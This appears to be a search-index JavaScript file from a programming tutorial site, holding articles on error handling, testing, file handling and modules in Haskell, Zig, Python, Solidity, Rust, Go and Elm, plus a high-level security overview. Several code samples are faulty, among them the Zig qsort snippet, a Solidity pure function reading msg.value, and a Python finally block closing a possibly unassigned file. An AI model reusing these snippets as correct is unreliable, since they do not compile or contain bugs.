immerse yourself in Haskell, keep experimenting with these concepts to discover new and innovative ways to approach your programming challenges.\nFrequently Asked Questions:\nQ: How do I debug pure functions in Haskell? A: Debugging pure functions can be done by examining input-output relations and using tools like GHCi for interactive evaluation of functions.\nQ: Are there performance trade-offs with using higher-order functions? A: While higher-order functions can lead to slightly slower performance due to additional abstraction layers, they often make code much clearer and more maintainable. Optimization techniques and compiler improvements also mitigate these issues significantly.\n"
            }
        );
    index.add(
            {
                id:  89 ,
                href: "\/tutorials\/docs\/zig\/zig\/dsa_zig\/",
                title: "DSA using Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Using Zig for data structures and algorithms (DSA) can be a rewarding experience due to Zig’s focus on safety, performance, and simplicity. While Zig does not have built-in data structures and algorithms libraries like some other languages, you can implement your own or utilize existing libraries from other languages through Zig’s interoperability with C.\nHere’s a basic overview of how you can use Zig for DSA:\nImplementing Data Structures linkZig allows you to implement various data structures, such as arrays, linked lists, stacks, queues, trees, and graphs, from scratch. You can define custom types and write functions to manipulate these data structures according to your requirements.\nExample: Implementing a Stack link const std = @import(\"std\"); const Stack = struct { items: [100]i32, size: usize = 0, pub fn push(self: *Stack, value: i32) void { self.items[self.size] = value; self.size += 1; } pub fn pop(self: *Stack) !i32 { if (self.size == 0) { return error.StackEmpty; } self.size -= 1; return self.items[self.size]; } }; Utilizing Existing Libraries linkZig can interface with existing libraries written in C, which opens up a vast ecosystem of DSA libraries. You can leverage libraries like GNU’s libavl for trees, libgraph for graphs, and others by linking them to your Zig project.\nExample: Using a C Library for Sorting link const c = @cImport({ @cInclude(\"stdlib.h\"); @cInclude(\"sort.h\"); }); pub fn main() void { var arr: [10]u32 = [5, 2, 7, 3, 9, 1, 4, 8, 6, 0]; const arr_ptr: [*c.uint32_t] = \u0026arr; c.qsort(arr_ptr, 10, c.sizeof(c.uint32_t), c.compare); } Writing Algorithms linkYou can implement various algorithms such as sorting, searching, graph traversal, dynamic programming, and more in Zig. Writing algorithms in Zig allows you to leverage its features like comptime execution for optimization and safety features for robustness.\nExample: Quick Sort Algorithm link fn quickSort(arr: []u32, left: usize, right: usize) void { if (left \u003e= right) { return; } const pivot = partition(arr, left, right); quickSort(arr, left, pivot - 1); quickSort(arr, pivot + 1, right); } fn partition(arr: []u32, left: usize, right: usize) usize { const pivot = arr[right]; var i = left - 1; for (var j = left; j \u003c right; j += 1) { if (arr[j] \u003c= pivot) { i += 1; const temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } } const temp = arr[i + 1]; arr[i + 1] = arr[right]; arr[right] = temp; return i + 1; } Conclusion linkWhile Zig may not have pre-built DSA libraries like other languages, its capabilities for low-level programming, interoperability with C, and emphasis on safety and performance make it a great choice for implementing data structures and algorithms from scratch or utilizing existing libraries. With Zig, you have the flexibility to tailor your DSA implementations to your specific needs while ensuring reliability and efficiency.\n"
            }
        );
    index.add(
            {
                id:  90 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/error-handling-in-haskell\/",
                title: "Effective Error Handling in Haskell",
                description: "Explore the sophisticated error handling techniques in Haskell, including the use of types like Either and monads for managing errors, and learn best practices for building robust Haskell applications.",
                content: "Introduction: linkWelcome back to our Haskell series, where today we focus on a crucial aspect of any robust application—error handling. Haskell, with its strong type system and pure functional nature, offers unique approaches for managing errors effectively. In this post, we will compare exceptions and type-based error handling, delve into using the Either type and error monads, and discuss best practices for ensuring your Haskell applications are as robust and error-resistant as possible.\nApproaches to Error Handling: Exceptions vs. Types linkUnderstanding Error Handling in Haskell:\nError handling in Haskell can generally be divided into two categories: using exceptions and using types. Each approach has its advantages and is suitable for different scenarios.\nExceptions: Exceptions in Haskell are used for handling errors in IO operations or other side-effectful interactions. They are not commonly used in pure functions because they violate purity (exceptions are inherently side effects).\nimport Control.Exception safeDivide :: Int -\u003e Int -\u003e IO Int safeDivide _ 0 = throwIO DivideByZero safeDivide x y = return (x `div` y) Type-based Error Handling: Type-based approaches leverage Haskell’s type system to make errors explicit in the type signature of functions. This method is more idiomatic in Haskell, promoting safer and more predictable code.\nsafeDivide :: Int -\u003e Int -\u003e Maybe Int safeDivide _ 0 = Nothing safeDivide x y = Just (x `div` y) Working with Either and Error Monads linkUsing the Either Type:\nEither is commonly used to handle computations that may fail. It extends Maybe by allowing you to return additional information about the failure.\nEither Type Basics:\nsafeDivide :: Int -\u003e Int -\u003e Either String Int safeDivide _ 0 = Left \"Cannot divide by zero.\" safeDivide x y = Right (x `div` y) Working with Error Monads: The Either type can be used as a monad, where Left represents an error and Right contains the successful computation. This facilitates chaining operations that might fail.\nimport Control.Monad (when) type Result = Either String checkAge :: Int -\u003e Result Int checkAge age = when (age \u003c 18) $ Left \"Age below 18 is not allowed.\" registerUser :: Int -\u003e Result String registerUser age = do validAge \u003c- checkAge age Right \"Registration Successful\" Best Practices for Building Robust Haskell Applications linkImplementing Robust Error Handling:\nTo build robust Haskell applications, it’s crucial to follow best practices tailored to Haskell’s strengths in type safety and functional purity.\nExplicit Error Handling: Prefer type-based error handling (like Either and Maybe) over exceptions for most of your application logic. This approach forces you to think about error cases upfront and handle them explicitly.\nComprehensive Testing: Utilize Haskell’s testing frameworks, such as QuickCheck, to test your error handling paths. Property-based testing can help ensure that your functions handle all expected error conditions correctly.\nModular Error Handling: Structure your error handling code to be modular and reusable. Utilize monads and monad transformers to abstract common patterns of error handling and reduce boilerplate.\nConclusion:\nError handling is a critical component of any software application, and Haskell provides powerful tools and patterns for managing errors effectively. By understanding the trade-offs between exceptions and type-based error handling, and using tools like Either and error monads, you can ensure that your Haskell programs are both correct and robust.\nFrequently Asked Questions:\nQ: How do I decide between using Maybe and Either for a function? A: Use Maybe when you don’t need to provide additional information about failure, and use Either when you need to provide details about why a computation failed.\nQ: Can I mix exceptions and type-based error handling in my Haskell applications? A: Yes, but it should be done cautiously. Reserve exceptions for unpredictable errors that occur at the IO level or in other side-effectful interactions, and use type-based methods for predictable, domain-specific errors.\n"
            }
        );
    index.add(
            {
                id:  91 ,
                href: "\/tutorials\/docs\/python\/python\/python_error_handling\/",
                title: "Effective Error Handling in Python: Try-Except Blocks and Finally Clause",
                description: "Learn how to robustly handle errors in Python using try-except blocks and the finally clause. This guide explains the mechanisms behind Python's error handling, with detailed examples to help you write more reliable code.",
                content: "Introduction linkHandling errors properly in a Python program is crucial to ensure that the program can gracefully handle unexpected situations without crashing. Python provides several ways to handle errors, most notably through try-except blocks and the finally clause.\nTry-Except Blocks linkTry-except blocks are used to catch and handle exceptions. An exception is an event, which occurs during the execution of a program that disrupts the normal flow of the program’s instructions.\nSyntax and Explanation: link try: # Code that might cause an exception except ExceptionType: # Code that runs if an exception occurs Example: link try: # Potential error code result = 10 / 0 except ZeroDivisionError: # Handling the specific error print(\"You can't divide by zero!\") This example tries to perform division by zero, which raises a ZeroDivisionError. The except block catches this specific error and prints a custom error message.\nExtending Try-Except Blocks linkYou can also catch multiple exceptions in a single try-except block, and use else and finally clauses for additional functionality.\nExample: link try: num = int(input(\"Enter a number: \")) inverse = 1 / num except ValueError: print(\"That's not a valid number!\") except ZeroDivisionError: print(\"Infinity! Division by zero.\") else: print(\"The inverse is:\", inverse) finally: print(\"This block always executes, regardless of any exceptions.\") In this detailed example:\nThe ValueError is caught if the input is not a valid integer. The ZeroDivisionError is caught if the number is zero. The else block runs if no exceptions are raised. The finally clause executes after all the other parts of the try-except block, regardless of whether an exception was raised or not. It is useful for clean-up actions that must be executed under all circumstances. Finally Clause linkThe finally clause is an optional block that, if specified, will execute as the last task before the try statement completes. The finally block runs whether or not an exception is caught.\nExample: link try: f = open('file.txt') data = f.read() print(data) except FileNotFoundError: print(\"File not found.\") finally: f.close() print(\"File closed.\") This example attempts to open and read a file. If the file does not exist, a FileNotFoundError is raised and handled. The finally block ensures that the file is closed after attempting to read it, whether the file was successfully opened or not.\nConclusion linkProper error handling is an essential aspect of developing robust Python applications. By understanding and implementing try-except blocks and the finally clause, you can prevent your programs from crashing unexpectedly and ensure they execute more reliably.\n"
            }
        );
    index.add(
            {
                id:  92 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/effective_error_handling_in_solidity\/",
                title: "Effective error handling in Solidity",
                description: "Learn how to handle errors effectively in solidity using keywords like Require, Revert and Assert.",
                content: "Error Handling in Solidity - Require, Assert, Revert linkError handling in Solidity is essential for ensuring that smart contracts function correctly and securely. Solidity provides three main mechanisms for handling errors: require(), assert(), and revert(). Each of these has specific use cases and behaviors that make them suitable for different types of error handling scenarios.\nUnderstanding Error Handling linkWhen an error occurs in Solidity, the Ethereum Virtual Machine (EVM) reverts all changes made to the blockchain’s state during the current call and its sub-calls. This means that any modifications are undone, and the state is returned to its previous condition. However, there are exceptions with low-level functions like delegatecall, send, and call, where an error will return a boolean false instead of propagating the error but we won’t be focusing on those.\nUsing require() linkThe require() function is used to validate inputs, return values, and conditions before proceeding with the main logic of the code. If the condition specified in require() is not met, the function throws an error and reverts the transaction.\nfunction requireExample() public pure { require(msg.value \u003e= 1 ether, \"you must pay me at least 1 ether!\"); } In this example, if the caller does not send at least 1 ether, the function reverts with the error message: “you must pay me at least 1 ether!”. The second argument to require() is optional but recommended for providing informative error messages. Note that while unused gas is returned, any gas used before the require() statement is not refunded, so it’s best to use require() early in the function.\nUsing assert() linkThe assert() function is used to check for conditions that should never be false. If an assert() condition fails, it throws an error of type Panic(uint256) and reverts the transaction.\ncontract ThrowMe { function assertExample() public pure { assert(address(this).balance == 0); // Do something. } } The assert() function is typically used to check invariants—conditions that must always hold true. In the example, the contract is designed to ensure that its balance is always zero, which is validated using assert(). Unlike require(), assert() is often used internally to verify that the contract’s state has not been corrupted.\nUsing revert() linkThe revert() function can be used for more complex conditional logic where the conditions for throwing an error are more elaborate. revert() can also be used to throw custom-defined errors, which can be more informative and cost-effective in terms of gas.\ncontract ThrowMe { // custom error error ThrowMe_BadInput(string errorMsg, uint inputNum); function revertExample(uint input) public pure { if (input \u003c 1000 ) { revert ThrowMe_BadInput(\"Number must be an even number greater than 999\", input); } if (input \u003c 0) { revert(\"Negative numbers not allowed\"); } } } In the example, the first revert() call uses a custom error ThrowMe_BadInput, providing specific error details and input value. This makes the error more readable and traceable. The second revert() call uses a simple string message. In both cases, the transaction reverts, and any unused gas is returned to the caller.\nSummary link require(): Use for validating inputs, return values, and conditions. It reverts the transaction if the condition is not met and returns an optional error message. assert(): Use for checking invariants and conditions that should never be false. It reverts the transaction with a Panic(uint256) error if the condition fails. revert(): Use for complex error handling and throwing custom-defined errors. It reverts the transaction and can provide detailed error information. By understanding and using these error-handling mechanisms appropriately, you can ensure that your Solidity smart contracts are robust, secure, and maintainable.\n"
            }
        );
    index.add(
            {
                id:  93 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/testing-and-debugging-in-haskell\/",
                title: "Effective Testing and Debugging in Haskell",
                description: "Master the art of testing and debugging Haskell code with this detailed guide. Learn how to write unit tests using HUnit and QuickCheck, debug effectively, and optimize performance.",
                content: "Introduction: linkWelcome to our in-depth exploration of testing and debugging in Haskell, essential skills for any Haskell developer looking to ensure the reliability and efficiency of their code. In this guide, we will dive into the best practices for writing unit tests with HUnit and QuickCheck, explore effective debugging techniques, and discuss how to profile and optimize Haskell applications for better performance. By mastering these techniques, you can build Haskell applications that are not only functional but also robust and efficient.\nWriting Unit Tests with HUnit and QuickCheck linkUnit Testing in Haskell:\nUnit testing is a critical component of software development that helps ensure individual parts of a program work as expected. In Haskell, tools like HUnit and QuickCheck provide powerful frameworks for creating comprehensive test suites.\nHUnit for Precise Testing: HUnit is a unit testing framework for Haskell, similar to JUnit in Java or PyUnit in Python. It allows you to create tests that specify expected outcomes for given inputs.\nimport Test.HUnit testListReverse :: Test testListReverse = TestCase $ assertEqual \"Should reverse a list\" [3, 2, 1] (reverse [1, 2, 3]) main :: IO () main = runTestTT testListReverse \u003e\u003e= print QuickCheck for Property-Based Testing: QuickCheck takes a different approach by allowing you to specify properties that your code should satisfy, then automatically generating test cases that test these properties across a wide range of random inputs.\nimport Test.QuickCheck prop_ReverseReverse :: [Int] -\u003e Bool prop_ReverseReverse xs = reverse (reverse xs) == xs main :: IO () main = quickCheck prop_ReverseReverse Debugging Haskell Code: Techniques and Tools linkEffective Debugging Strategies:\nDebugging functional programs can be challenging due to immutability and higher-order functions. However, Haskell offers several tools and techniques to simplify this process.\nUsing GHCi for Interactive Debugging: GHCi, the interactive interpreter for Haskell, can be used to load code and test functions interactively, making it easier to isolate and diagnose issues.\nDebug.Trace for Tracing Execution: While it’s generally best to avoid side effects in Haskell, sometimes quick and dirty debugging is necessary. Debug.Trace allows you to insert print statements for debugging purposes, which can be invaluable for tracing the flow of execution and values.\nimport Debug.Trace factorial :: Integer -\u003e Integer factorial 0 = 1 factorial n = trace (\"factorial \" ++ show n) (n * factorial (n - 1)) Performance Profiling and Optimization linkOptimizing Haskell Code:\nPerformance profiling is crucial for optimizing Haskell applications, especially those intended for production environments.\nUsing GHC Profiling Tools: GHC provides built-in support for profiling Haskell programs, allowing you to analyze memory usage and performance characteristics.\nCompile with profiling enabled: ghc -prof -fprof-auto -rtsopts your_program.hs Run the program with profiling options: ./your_program +RTS -p Best Practices for Performance Optimization:\nLazy Evaluation: Be mindful of Haskell’s lazy evaluation model, which can lead to unexpected memory usage. Use strict evaluation where necessary to avoid space leaks. Algorithmic Improvements: Often, the biggest gains come from improving algorithms or using more efficient data structures, like switching from lists to vectors for intensive numeric computations. Conclusion:\nTesting, debugging, and optimizing are essential skills for any Haskell developer. By incorporating rigorous testing frameworks like HUnit and QuickCheck, adopting effective debugging techniques, and profiling your applications, you can ensure that your Haskell code is not only correct but also performs well under various conditions. Continue to explore these tools and techniques to enhance your proficiency in Haskell programming.\nFrequently Asked Questions:\nQ: How can I ensure that my Haskell tests cover edge cases? **A: Combine manual unit tests that target specific scenarios with\nproperty-based tests in QuickCheck that can automatically generate a wide range of inputs, including edge cases.**\nQ: What are common performance pitfalls in Haskell? A: Common pitfalls include unintentional retention of large data structures due to lazy evaluation, and the use of inefficient algorithms or data structures. Profiling tools are critical in identifying and addressing these issues.\n"
            }
        );
    index.add(
            {
                id:  94 ,
                href: "\/tutorials\/docs\/rust\/rust\/effective_testing_strategies_rust\/",
                title: "Effective Testing Strategies in Rust",
                description: "Master the art of testing in Rust with this comprehensive guide on writing unit tests, managing integration tests, and organizing test suites. Packed with technical details, practical examples, and best practices, this post will help you ensure robustness and reliability in your Rust applications through effective testing methodologies.",
                content: "Introduction linkTesting is a critical component of software development, ensuring that code behaves as expected and helping maintain code quality. Rust provides first-class support for writing automated tests, including unit tests, integration tests, and more. This post delves into the testing features Rust offers, how to utilize them effectively, and best practices for organizing tests in your Rust projects.\nWriting Unit Tests linkUnit tests are small, fast tests that verify functionality at a specific level of granularity, typically at the function or module level. In Rust, unit tests are conventionally written in the same file as the code they test, using modules.\nBasic Structure of Unit Tests:\nCreating a Tests Module:\n#[cfg(test)] mod tests { #[test] fn it_works() { assert_eq!(2 + 2, 4); } } Here, #[cfg(test)] configures the enclosed module to only compile when running tests, not in the production build. #[test] flags a function as a test case.\nUsing Assertions:\nassert!(expression): Asserts that the expression evaluates to true. assert_eq!(left, right): Asserts that two expressions are equal. assert_ne!(left, right): Asserts that two expressions are not equal. Best Practices for Unit Testing:\nTest One Thing at a Time: Each test should verify a single aspect of a function. Use Descriptive Test Names: Function names should convey what they test. Setup and Teardown: Use setup code to prepare the environment for tests, and if necessary, use teardown code to clean up afterwards. Integration Tests and Test Organization linkIntegration tests in Rust are typically written in separate files in a tests directory. They allow you to test multiple parts of your library together to ensure they work correctly in conjunction.\nSetting Up Integration Tests:\nDirectory Structure:\nsrc/ tests/ integration_test.rs The tests directory is the conventional place to put integration test files, where each file in the directory is compiled as a separate crate.\nExample of an Integration Test:\n// in tests/integration_test.rs extern crate your_crate; #[test] fn test_integration() { assert_eq!(your_crate::some_module::some_function(), 42); } Organizing Tests:\nSubmodules in Integration Tests: Use submodules within test files to group related tests. Common Setup Code: For shared setup code across multiple tests, use a common module, typically by creating a mod common; in the tests directory, which can be used by multiple test files. Advanced Testing Features link Mocking and Test Doubles: Rust doesn’t include a built-in mocking library, but you can use crates like mockall or criterion for more sophisticated testing needs such as benchmarking. Conditional Test Compilation: Use #[cfg(test)] to include test-specific modules or code, ensuring they are not included in the production build. Conclusion linkEffective testing is essential for developing reliable and maintainable software. Rust’s built-in test framework supports robust testing practices, making it straightforward to write, organize, and execute tests. By following best practices for unit and integration testing, developers can ensure their Rust applications perform as expected now and as they evolve in the future.\n"
            }
        );
    index.add(
            {
                id:  95 ,
                href: "\/tutorials\/docs\/python\/python\/python_file_handling\/",
                title: "Efficient File Handling in Python: Reading, Writing, and Path Management",
                description: "Master file handling techniques in Python with this detailed guide. Learn how to read from and write to files effectively and manage file paths to handle data smoothly in your applications.",
                content: "Introduction linkFile handling is a critical aspect of many programming tasks, from data analysis to web development. Python provides built-in functions and modules that simplify reading from and writing to files, as well as managing file paths.\nReading from and Writing to Files linkPython uses file objects to interact with external files on your system. Files can be opened in various modes, like ‘r’ for reading, ‘w’ for writing, and ‘a’ for appending.\nOpening and Reading Files linkTo read from a file, you must open it in read mode (‘r’) which is also the default mode when no mode is specified.\n# Reading an entire file with open('example.txt', 'r') as file: content = file.read() print(content) # Reading line by line with open('example.txt', 'r') as file: for line in file: print(line.strip()) # strip() removes the newline characters The with statement handles the file object and ensures it is properly closed after completing the operations. file.read() reads the entire file content into a string. Reading line by line is useful for large files that do not fit into memory.\nWriting to Files linkTo write to a file, open it in write (‘w’) or append (‘a’) mode. Write mode overwrites the existing file content, while append mode adds to the end of the file.\n# Writing to a file with open('output.txt', 'w') as file: file.write(\"Hello, Python!\\n\") # Appending to a file with open('output.txt', 'a') as file: file.write(\"Adding more text.\\n\") The file.write() method writes a string to the file. Note that newline characters (\\n) are used to move to the next line.\nWorking with File Paths linkManaging file paths is essential for locating files on your filesystem. The os and pathlib modules provide tools for building and managing paths across different operating systems.\nUsing os.path link import os # Getting the absolute path current_dir = os.getcwd() print(\"Current directory:\", current_dir) # Joining paths file_path = os.path.join(current_dir, 'output.txt') print(\"File path:\", file_path) # Checking if a file exists exists = os.path.exists(file_path) print(\"Does file exist?\", exists) os.path offers functions like getcwd() for current directory, join() for path concatenation, and exists() to check if a path exists.\nUsing pathlib link from pathlib import Path # Creating a Path object p = Path('example.txt') # Reading from a file using pathlib if p.exists(): print(p.read_text()) # Writing to a file using pathlib p.write_text(\"Hello, Python!\\n\") Pathlib provides an object-oriented approach to filesystem paths. It includes methods like read_text() and write_text() which are straightforward for reading and writing files.\nConclusion linkEffective file handling in Python enhances the functionality of applications by allowing data persistence and manipulation. This guide provided an in-depth look at reading from and writing to files, as well as managing file paths using both os.path and pathlib. These skills are essential for any Python programmer dealing with data input and output.\n"
            }
        );
    index.add(
            {
                id:  96 ,
                href: "\/tutorials\/docs\/golang\/golang\/packages-and-dependency-management-in-go\/",
                title: "Efficient Go Programming",
                description: "Learn how to organize your Go code with packages, manage dependencies with Go modules, and publish your own packages for the Go community.",
                content: "Introduction:\nWelcome back, Go enthusiasts! As you develop more complex applications or contribute to larger projects, understanding how to efficiently organize your Go code into packages and manage dependencies is essential. This blog will guide you through organizing your code with packages, using Go modules for dependency management, and publishing your own packages. These practices will help you maintain a clean codebase, manage dependencies easily, and share your work with the Go community.\n1. Organizing Code with Packages\nIn Go, packages are a way of organizing code that groups related functionalities together. Each directory under your project can be considered a package, which can contain multiple Go files. A well-structured package can be imported and used in other parts of your program or by other programs.\na. Creating Packages:\nTo create a package, simply create a new directory within your project directory. Any Go file placed in this directory should declare this directory as its package at the top of the file:\n// In a file located in /path/to/yourproject/mypackage/file.go package mypackage b. Exporting Functions, Types, and Variables:\nYou can control the visibility of functions, types, and variables to other packages through Go’s case sensitivity feature:\nExported identifiers: Start with a capital letter and can be accessed from other packages. Unexported identifiers: Start with a lowercase letter and are private to the package. package mypackage // Exported Function func MyFunction() { // Function logic here } // unexported function func myPrivateFunction() { // Function logic here } 2. Using Go Modules for Dependency Management\nGo modules are the official dependency management system in Go, introduced in version 1.11. They allow you to track, update, and manage the dependencies of your Go projects.\na. Creating a New Module:\nYou can create a new module by initializing it in your project’s root directory:\ngo mod init github.com/yourusername/yourproject This command creates a go.mod file that describes your module, its dependencies, and other necessary information.\nb. Managing Dependencies:\nWhen you import packages that are not part of the standard library, Go modules will automatically add them to your go.mod file and download the packages into your project:\nimport \"github.com/someuser/somepackage\" To update or tidy your dependencies, you can use commands like:\ngo get -u // Update all dependencies to their latest minor or patch releases go mod tidy // Remove unused dependencies 3. Publishing Your Own Packages\nSharing your code with other developers can be rewarding and beneficial for the community. To publish your package, you need to:\na. Prepare the Package:\nMake sure your code is well-documented. Ensure all public APIs are stable and well-tested. Organize your code into a sensible package structure. b. Version Your Package:\nUse semantic versioning (e.g., v1.0.0, v1.0.1) when tagging releases in your version control system. c. Publish on Version Control Systems:\nPush your code to a public repository on platforms like GitHub, GitLab, or Bitbucket. Tag your release appropriately. Conclusion:\nMastering packages and dependency management in Go will elevate your development skills and improve the quality of your projects. By effectively organizing your code into packages, managing dependencies with Go modules, and sharing your work, you contribute to a vibrant ecosystem and reap the benefits of collaborative development.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: What is the difference between a library and a package in Go? A: In Go, a package is a single import path corresponding to a directory of Go files. A library is a collection of packages that provides functionality for other programs to use, without being a standalone executable.\nQ: How can I ensure that my Go module works well with others? A: Keep your APIs minimal and stable, use semantic versioning, and ensure that your module’s dependencies are managed correctly in the go.mod file.\n"
            }
        );
    index.add(
            {
                id:  97 ,
                href: "\/tutorials\/docs\/elixir\/",
                title: "Elixir",
                description: "Elixir is a process-oriented, functional programming language that runs on the Erlang virtual machine (BEAM). The language was influenced by Ruby. This inspiration can be seen and felt in Elixir’s ecosystem and tooling options. Elixir is known to be easy to learn and widely applicable within the software development industry.",
                content: ""
            }
        );
    index.add(
            {
                id:  98 ,
                href: "\/tutorials\/docs\/elm\/",
                title: "Elm",
                description: "Elm is a delightful language for reliable web applications. It compiles to JavaScript, but it's much more than just a language; it's a framework for making web development more robust and pleasant.",
                content: ""
            }
        );
    index.add(
            {
                id:  99 ,
                href: "\/tutorials\/docs\/technical-architecture\/technical-architecture\/ensuring_security_in_your_architecture\/",
                title: "Ensuring Security in Your Technical Architecture",
                description: "In today’s digital landscape, security is paramount when designing and implementing technical architectures. As technology advances, so do the threats and vulnerabilities that can compromise systems. This blog post aims to provide a comprehensive guide to incorporating robust security measures into your technical architecture. We will explore common threats, best practices for secure coding, and essential tools and frameworks to bolster your system’s defenses.\nCommon Security Threats link SQL Injection (SQLi):",
                content: "In today’s digital landscape, security is paramount when designing and implementing technical architectures. As technology advances, so do the threats and vulnerabilities that can compromise systems. This blog post aims to provide a comprehensive guide to incorporating robust security measures into your technical architecture. We will explore common threats, best practices for secure coding, and essential tools and frameworks to bolster your system’s defenses.\nCommon Security Threats link SQL Injection (SQLi):\nThreat: Attackers inject malicious SQL code into input fields to manipulate databases. Mitigation: Use parameterized queries, ORM frameworks, and input validation to prevent SQL injection attacks. Cross-Site Scripting (XSS):\nThreat: Attackers inject malicious scripts into web pages viewed by other users. Mitigation: Implement output encoding, validate and sanitize user inputs, and use Content Security Policy (CSP) headers. Cross-Site Request Forgery (CSRF):\nThreat: Attackers trick users into executing unwanted actions in applications where they are authenticated. Mitigation: Use anti-CSRF tokens, verify HTTP referer headers, and employ SameSite cookies attribute. Sensitive Data Exposure:\nThreat: Insecure storage, transmission, or handling of sensitive information (e.g., passwords, credit card numbers). Mitigation: Encrypt sensitive data at rest and in transit, use secure communication protocols (TLS/SSL), and comply with data protection regulations (e.g., GDPR, CCPA). Authentication and Authorization Issues:\nThreat: Weak authentication mechanisms, improper session management, or insufficient access controls. Mitigation: Implement multi-factor authentication (MFA), enforce strong password policies, and use role-based access control (RBAC). Secure Coding Practices linkDevelopers play a crucial role in ensuring system security through their coding practices. Here are essential guidelines:\nInput Validation: Validate and sanitize all user inputs to prevent injection attacks. Least Privilege Principle: Grant users and processes only the minimum level of access necessary to perform their tasks. Secure Authentication: Use secure authentication methods (e.g., OAuth, JWT) and implement password hashing with strong algorithms (e.g., bcrypt, Argon2). Error Handling: Implement proper error handling to prevent information leakage and provide informative error messages without revealing sensitive details. Regular Updates: Keep software dependencies, libraries, and frameworks updated with the latest security patches. Tools and Frameworks for Enhancing Security linkUtilizing specialized tools and frameworks can significantly enhance the security posture of your technical architecture:\nStatic Application Security Testing (SAST) Tools:\nExamples: Fortify, Veracode, SonarQube. Purpose: Identify security vulnerabilities in the source code during development. Dynamic Application Security Testing (DAST) Tools:\nExamples: OWASP ZAP, Burp Suite, Acunetix. Purpose: Test running applications for security vulnerabilities in real-time. Web Application Firewalls (WAF):\nExamples: AWS WAF, ModSecurity. Purpose: Protect web applications from common attacks (e.g., XSS, SQLi) by filtering and monitoring HTTP traffic. Security Information and Event Management (SIEM) Systems:\nExamples: Splunk, LogRhythm, Elastic SIEM. Purpose: Aggregate and analyze security event logs to detect and respond to potential security incidents. Encryption Libraries:\nExamples: OpenSSL, Bouncy Castle. Purpose: Provide encryption and decryption capabilities for protecting sensitive data. Conclusion linkIncorporating robust security measures into your technical architecture is not an option but a necessity in today’s threat landscape. By understanding common security threats, implementing secure coding practices, and leveraging appropriate tools and frameworks, you can significantly mitigate risks and protect your systems and data from malicious attacks. Remember, security is an ongoing process that requires continuous monitoring, updating, and adaptation to new threats and vulnerabilities.\nBy adopting a proactive approach to security in your technical architecture, you can build trust with users, comply with regulatory requirements, and safeguard your organization’s reputation and assets. Stay vigilant and prioritize security from the inception of your projects to ensure a resilient and secure technical environment.\n"
            }
        );
    index.add(
            {
                id:  100 ,
                href: "\/tutorials\/docs\/erlang\/",
                title: "Erlang",
                description: "Erlang was created by Ericsson's Computer Science Lab in 1986 for handling large-scale telecommunications projects. Its development was driven by the need for a robust system capable of managing numerous concurrent activities with high levels of fault tolerance.",
                content: ""
            }
        );
    index.add(
            {
                id:  101 ,
                href: "\/tutorials\/docs\/elm\/elm\/error_handling_in_elm\/",
                title: "Error Handling in Elm",
                description: "Handling HTTP requests and JSON data in Elm.",
                content: "An error is any unexpected condition in a program. Errors can occur at either compile-time or runtime. Compile time errors occur during the compilation of a program (For example, error in the program’s syntax) while runtime errors occur during the program’s execution. Unlike other programming languages, Elm does not throw runtime errors.\nConsider an application that accepts the age of a user. The application should throw an error if the age is zero or negative. In this case, the Elm application can use the concept of error handling to explicitly raise an error at runtime if the user enters zero or a negative value as age. Error handling specifies the course of action if anything unexpected happens during the program’s execution.\nElm programming language handles errors in the following ways − MayBe and Result\nMayBe linkConsider the search feature in an application. The search function returns related data if the search keyword is found else does not return anything. This use case can be implemented in Elm using the MayBe type.\nSyntax\nvariable_name:MayBe data_type A variable of type MayBe can contain either of the following values −\nJust some_Value − This is used if there is valid data. Nothing − This is used if the value is absent or unknown. Nothing is equivalent to null in other programming languages. Illustration The following example shows how to use MayBe type with variables and function.\nStep 1 − Create a MayBeDemo.elm file and add the following code to it\n-- MayBeDemo.elm module MayBeDemo exposing(..) import Maybe --declaring a MayBe variable and assigning value to it userName : Maybe String userName = Just \"Mohtashim\" --declaring a MayBe variable and assigning value to it userAge :Maybe Int userAge = Just 20 --declaring a MayBe variable and assigning value to it userSalary:Maybe Float userSalary = Nothing --declaring a custom type type Country = India | China | SriLanka --defining a function that takes a String parameter as input and returns a value of type MayBe getCountryFromString : String -\u003e Maybe Country getCountryFromString p = case p of \"India\" -\u003e Just India \"China\" -\u003e Just China \"SriLanka\" -\u003e Just SriLanka _ -\u003e Nothing Step 2 − Import the module in elm repl and execute as given below\nE:\\ElmWorks\\ErroApp\u003e elm repl ---- elm-repl 0.18.0 ----------------------------------------------------------- :help for help, :exit to exit, more at -------------------------------------------------------------------------------- \u003e import MayBeDemo exposing(..) \u003e userName Just \"Mohtashim\" : Maybe.Maybe String \u003e userAge Just 20 : Maybe.Maybe Int \u003e userSalary Nothing : Maybe.Maybe Float \u003e getCountryFromString \"India\" Just India : Maybe.Maybe MayBeDemo.Country \u003e getCountryFromString \"india\" Nothing : Maybe.Maybe MayBeDemo.Country The function checks if the value passed to the function is India or China or SriLanka. If the parameter’s value does not match any of these, it returns nothing.\nResult linkConsider an example, where the application needs to validate some condition and raise an error if the condition is not satisfied. The Result type can be used to achieve this. The Result type should be used if the application wants to explicitly raise an error and return details about what went wrong.\nSyntax The Result type declaration takes two parameters – the data type of the error (usually String) and the data type of the result to be returned if everything goes fine.\ntype Result error_type data_value_type = Ok data_value | Err error_message The Result type returns either of the following values −\nOk some_value − Represents result to be returned Err − Represents the error message to be returned if the expected conditions are not satisfied. Illustration 1 Try the following example in the Elm REPL −\n\u003e String.toInt : String -\u003e Result.Result String Int -- successful result \u003e String.toInt \"10\" Ok 10 : Result.Result String Int -- unsuccessful result , Error \u003e String.toInt \"a\" Err \"could not convert string 'a' to an Int\" : Result.Result String Int The String.toInt function returns Integer value if the parameter passed is valid. If the parameter is not a number, the function returns an error.\nIllustration 2 The following example accepts age as a parameter. The function returns the age if it is between 0 and 135 else it returns an appropriate error message.\nStep 1 − Create a ResultDemo.elm file and add the following code to it.\n--ResultDemo.elm module ResultDemo exposing(..) userId : Result String Int userId = Ok 10 emailId : Result String Int emailId = Err \"Not valid emailId\" isReasonableAge : String -\u003e Result String Int isReasonableAge input = case String.toInt input of Err r -\u003e Err \"That is not a age!\" Ok age -\u003e if age \u003c 0 then Err \"Please try again ,age can't be negative\" else if age \u003e 135 then Err \"Please try agian,age can't be this 